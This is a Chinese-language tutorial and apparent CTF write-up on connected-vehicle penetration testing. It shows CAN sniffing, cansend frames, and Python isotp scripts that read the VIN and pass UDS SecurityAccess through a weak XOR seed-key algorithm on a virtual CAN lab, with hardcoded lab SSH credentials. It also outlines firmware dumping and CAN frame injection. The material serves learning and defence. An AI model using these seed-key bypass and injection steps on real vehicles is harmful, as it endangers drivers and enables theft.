# 车联网渗透测试流程

## 信息收集

公开渠道可以获取大量信息：FCC ID数据库搜索无线模块认证信息、供应商官网下载MCU数据手册、论坛和社交媒体寻找ECU拆解图、GitHub上搜索车型相关的开源工具或逆向工程记录。

## 攻击面枚举

这一阶段开始物理接触车辆。最经典的工具组合：USB-CAN适配器 + Wireshark（配合CAN插件）+ 一个脚本。用`candump`记录15-20分钟的正常运行CAN流量，然后通过帧频率分析的思路反向推断每个ID的功能：

```
# 简单示例：通过帧频率推断CAN-ID功能
# ID=0x1A4，10ms周期 → 大概率是动力域数据
# ID=0x3E8，100ms周期 → 可能是车身状态广播
# ID=0x7DF，事件驱动 → 诊断会话可能性高
```

测试人员还会扫描所有物理接口——OBD-II、USB、以太网、JTAG/SWD调试口——每一个都是潜在入口。

## 漏洞利用

常见的攻击路径包括：
- **UDS $27安全访问绕过**：暴力破解种子-密钥算法。如果算法只是简单的XOR/移位，几分钟就能逆向。正确做法是使用基于HSM的对称密钥认证。
- **固件提取与逆向**：通过JTAG/SWD接口或Bootloader漏洞Dump出完整固件，用Ghidra/IDA Pro反编译，搜索硬编码密钥、调试后门和未关闭的测试接口。
- **CAN帧注入**：在获取CAN矩阵的基础上，注入伪造控制帧验证实际影响。
- **无线攻击面**：蓝牙/BLE、Wi-Fi、NFC、TPMS（胎压监测）——每个无线接口都可能被利用。2020年Uber安全团队演示了通过TPMS传感器伪造胎压数据，触发车辆误报警

### CAN-ID

| CAN ID | 方向     | 含义                           |
| ------ | ------ | ---------------------------- |
| 0x7DF  | Tx（发送） | OBD-II 功能寻址请求 ID（对所有 ECU 广播） |
| 0x730  | Tx     | 物理寻址请求 ID（指向特定 ECU）          |
| 0x7B0  | Rx（接收） | ECU 的物理响应 ID                 |

在车联网（Telematics）和汽车诊断里，DID F190 指的是 Vehicle Identification Number（VIN，车辆识别码） 的标准诊断数据标识符（Data Identifier）。

我们开启一个新的终端进行监听，即执行命令：

```bash
candump vcan0

#顺利的话，就会收到，下方的请求，显示内容如下：
ctfuser@db1f0db98d9e:~/challenge$  candump vcan0
  vcan0  7E0   [4]  03 22 F1 90
  vcan0  7E8   [8]  10 1C 62 F1 90 55 44 53
  vcan0  7E0   [3]  02 27 01
  vcan0  7E8   [7]  06 67 01 61 6D 4A E5
  vcan0  7E0   [7]  06 27 02 BF C0 F4 0A
  vcan0  7E8   [3]  02 67 02
  vcan0  7E0   [4]  03 22 C1 C2
  vcan0  7E8   [8]  10 1E 62 C1 C2 55 44 53
  vcan0  7E0   [3]  30 00 00
  vcan0  7E8   [8]  21 43 54 46 7B 32 37 5F
  vcan0  7E8   [8]  22 73 65 63 75 72 69 74
  vcan0  7E8   [8]  23 79 58 30 72 5F 43 31
  vcan0  7E8   [4]  24 43 32 7D
```

在另一个终端发送：

```bash
cansend vcan0 7DF#0322F190   #广播
或者
cansend vcan0 7E0#0222F190   #点对点，只发送给发动机ECU
```

其实发送的内容的格式就是：`ID#DATA`。
在我们这个例子中，DATA就是 UDS 协议，`03 22 F1 90`。具体表示含义可以查询UDS定义的服务表：

| SID（16进制） | 含义                        |
| --------- | ------------------------- |
| 10        | 进入诊断                      |
| 11        | ECU Reset                 |
| 14        | 清除故障码                     |
| 19        | 读取故障                      |
| 22        | 读取数据                      |
| 23        | 内存dump，用法23+地址；需要先获取安全级别。 |
| 27        | Security Access           |
| 2E        | 写数据                       |
| 31        | Routine Control           |

| 字节    | 含义                                                                                                                     |
| ----- | ---------------------------------------------------------------------------------------------------------------------- |
| 7DF   | 这个字段成为ID字段，表示的内容可以是各个ECU单元，如0x123表示发动机ECU。但也有例外，如这里的0x7DF表示的就是CAN ID（功能寻址 Functional Address），相当于是个广播，所有ECU单元都要接受这个消息。 |
| 03    | ISO-TP Single Frame，后面有 3 字节 UDS 数据。CAN一帧最多8个byte，这里的03表示的就是后面的有效字节为3位。                                                |
| 22    | UDS Service：ReadDataByIdentifier，表示要读取数据                                                                               |
| F1 90 | DID = VIN，即要读取的内容就是DID-VIN                                                                                             |

UDS规定，所有成功响应要是：

```css
Response SID

=

Request SID + 0x40

对应我们这个例子就是0x22+0x40=62，所以62 F1 90就表示成功读取DID F1 90.
```

---

当然我们也可以ssh登录后使用脚本完成这个任务：

```python
python3 -c "
import isotp

# 创建ISOTP套接字
s = isotp.socket()
# 设置流控参数：最小间隔0，块大小0（不拆分多帧）
s.set_fc_opts(stmin=0, bs=0) 
# 绑定vcan0，发送ID 0x7E0,接受偏移量固定+8;接收ID 0x7E8，
s.bind('vcan0', isotp.Address(rxid=0x7e8, txid=0x7e0))
# 发送22服务读取0xF190数据
s.send(bytes([0x22, 0xF1, 0x90]))
# 接收应答数据
r = s.recv()
# 截取有效数据段并打印
print('Flag:', r[3:].decode())  #r[0]:0x62.r[1]:0xF1,r[2]:0x90,（协议头）
# 关闭套接字
s.close()
"
```


### UDS SecurityAccess（0x27）

> 这一栏目，主要用来理解这个服务，而不是进行算法破解。使用到的项目依然是：https://github.com/yichen115/UDSCTF

USD SecurityAccess的流程可以概括为下面：

```css
        Tester                          ECU
           │
           │ 27 01   (请求Seed)                     //第一步请求Seed：cansend vcan0 7DF#022701
           │────────────────────────────►
           │
           │◄────────────────────────────           //回复要求为SID+0x40
           │ 67 01 seed
           │
           │ key = seed ^ 0xDEADBEEF                //第二步，计算key，生产环境会用更复杂的加密。计算得：CC99E897
           │
           │ 27 02 key
           │────────────────────────────►           //第三步发送key：cansend vcan0 7DF#06 27 02 CC99E897
           │
           │◄────────────────────────────
           │ 67 02
           │
           │ 22 C1 C2
           │────────────────────────────►           //成功进入Security Level1，读取C1C2：cansend vcan0 7DF#0322C1C2
           │
           │◄────────────────────────────
           │ 62 C1 C2 flag...
```

第一步：请求Seed

```bash
cansend vcan0 7DF#022701
```

这里的0x27就表示`SecurityAccess`，后面的`0x01`表示`Request Seed Level1`。

--- 
当然我们也可以使用脚本完成这个任务：

```python
import paramiko
import isotp
import sys

HOST = '192.168.72.128'
PORT = 2222
USER = 'ctfuser'
PASS = 'ctfpassword'

remote_script = r'''
s = isotp.socket()
s.set_fc_opts(stmin=0, bs=0)
s.bind('vcan0', isotp.Address(rxid=0x7e8, txid=0x7e0))

# 请求 Level 1 的 seed
print("Requesting seed for Level 1...")
s.send(bytes([0x27, 0x01]))
r = s.recv()
print("    Response:", ' '.join(f"{b:02X}" for b in r))      #转换为2位的大写十六进制

if r and r[0] == 0x67 and r[1] == 0x01:     #r[0]=0x67=0x27+0x40,0x27就是安全访问
    seed = int.from_bytes(r[2:6], 'big')
    print(f"    Seed: 0x{seed:08X}")

    # 计算 key (key = seed ^ 0xDEADBEEF)
    key = seed ^ 0xDEADBEEF
    print(f"Key = seed ^ 0xDEADBEEF = 0x{key:08X}")
'''  
```

--- 

这里简单介绍一下安全访问。先来解释下为什么会有这么一个东西。

假设一辆车支持：

- 读取 VIN
- 修改 ECU 参数
- 刷写固件
- 清除防盗
- 写 EEPROM

如果任何人都能发送：

```
2E xxxx
```

修改数据，或者用：

```
34 ...
```

下载固件，那汽车就毫无安全性。所以 UDS 增加了：

```tex
Security Access

27
```

只有解锁以后才能执行敏感操作。工作流程我们在上面的例子已经解释过了，就不在赘述。


下面解释下，为什么这些安全级别会称呼为level1, level3,  level5：

因为ISO14229规定，奇数：

```tex
01
03
05
07
09
...
```

用于`Request Seed`，而对应的偶数是`Send Key`。

很多厂商为了方便，

直接叫：

```
Level1：    27 01

Level3：    27 03

Level5：    27 05
```
